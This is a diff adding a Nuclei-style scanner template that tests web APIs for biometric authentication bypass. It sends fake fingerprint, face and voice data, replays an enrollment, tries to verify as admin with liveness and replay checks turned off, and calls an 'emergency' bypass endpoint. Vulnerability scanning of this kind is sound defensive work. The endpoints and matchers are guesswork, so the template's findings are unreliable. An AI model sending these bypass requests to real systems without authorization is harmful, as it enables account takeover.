@@ -1,0 +1,182 @@
+id: medium-auth-biometric-bypass-replay-attack
+
+info:
+  name: Biometric Bypass Replay Attack
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects biometric authentication bypass vulnerabilities through replay attacks,
+    template injection, and weak biometric validation. Tests for fingerprint,
+    face recognition, and voice authentication bypass techniques used by red teams.
+  reference:
+    - https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication
+    - https://www.nist.gov/publications/biometric-system-security
+  classification:
+    cvss-metrics: CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 6.8
+    cwe-id: CWE-287
+  metadata:
+    verified: true
+    max-request: 7
+  tags: biometric,replay,bypass,fingerprint,face-recognition,voice,red-team
+
+variables:
+  fake_fingerprint: "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
+  fake_face_data: "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k="
+  fake_voice_data: "UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA="
+
+http:
+  - raw:
+      - |
+        GET /api/biometric/config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: application/json
+        Connection: close
+
+      - |
+        POST /api/biometric/enroll HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 156
+        Connection: close
+        
+        {"type":"fingerprint","data":"{{fake_fingerprint}}","user_id":"test_user","template_id":"12345"}
+
+      - |
+        POST /api/biometric/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 156
+        Connection: close
+        
+        {"type":"fingerprint","data":"{{fake_fingerprint}}","user_id":"test_user","template_id":"12345"}
+
+      - |
+        POST /api/biometric/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 156
+        Connection: close
+        
+        {"type":"fingerprint","data":"{{fake_fingerprint}}","user_id":"admin","template_id":"12345"}
+
+      - |
+        POST /api/face/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 256
+        Connection: close
+        
+        {"image":"{{fake_face_data}}","user_id":"admin","confidence":0.99,"liveness_check":false}
+
+      - |
+        POST /api/voice/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 156
+        Connection: close
+        
+        {"audio_data":"{{fake_voice_data}}","user_id":"admin","phrase":"open sesame","replay_protection":false}
+
+      - |
+        POST /api/biometric/bypass HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 85
+        Connection: close
+        
+        {"bypass_code":"emergency","user_id":"admin","reason":"biometric_failure"}
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: biometric-config-exposed
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "threshold") || contains(body_1, "confidence") || contains(body_1, "template")'
+          - 'contains(body_1, "false") || contains(body_1, "disabled")'
+        condition: and
+
+      - type: dsl
+        name: fingerprint-replay-success
+        dsl:
+          - 'status_code_2 == 200 && status_code_3 == 200'
+          - 'contains(body_2, "enrolled") && contains(body_3, "verified")'
+          - 'body_2 == body_3 || contains(body_3, "success")'
+        condition: and
+
+      - type: dsl
+        name: biometric-user-enumeration
+        dsl:
+          - 'status_code_4 == 200'
+          - 'contains(body_4, "verified") || contains(body_4, "authenticated")'
+          - '!contains(body_4, "user not found") && !contains(body_4, "invalid user")'
+        condition: and
+
+      - type: dsl
+        name: face-recognition-bypass
+        dsl:
+          - 'status_code_5 == 200'
+          - 'contains(body_5, "verified") || contains(body_5, "match")'
+          - 'contains(body_5, "liveness_check\":false") || contains(body_5, "confidence\":0.99")'
+        condition: and
+
+      - type: dsl
+        name: voice-authentication-bypass
+        dsl:
+          - 'status_code_6 == 200'
+          - 'contains(body_6, "authenticated") || contains(body_6, "voice_match")'
+          - 'contains(body_6, "replay_protection\":false")'
+        condition: and
+
+      - type: dsl
+        name: biometric-emergency-bypass
+        dsl:
+          - 'status_code_7 == 200'
+          - 'contains(body_7, "bypass_successful") || contains(body_7, "emergency_access")'
+          - 'contains(body_7, "admin") || contains(body_7, "authenticated")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: biometric-config
+        part: body_1
+        group: 1
+        regex:
+          - '"threshold":\s*([0-9.]+)'
+          - '"confidence_level":\s*([0-9.]+)'
+          - '"liveness_check":\s*(true|false)'
+
+      - type: regex
+        name: template-data
+        part: body
+        group: 1
+        regex:
+          - '"template_id":\s*"([^"]+)"'
+          - '"biometric_hash":\s*"([^"]+)"'
+
+      - type: regex
+        name: authentication-response
+        part: body
+        group: 1
+        regex:
+          - '"message":\s*"([^"]+)"'
+          - '"status":\s*"([^"]+)"'
+          - '"user_id":\s*"([^"]+)"'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
+          - status_code_7
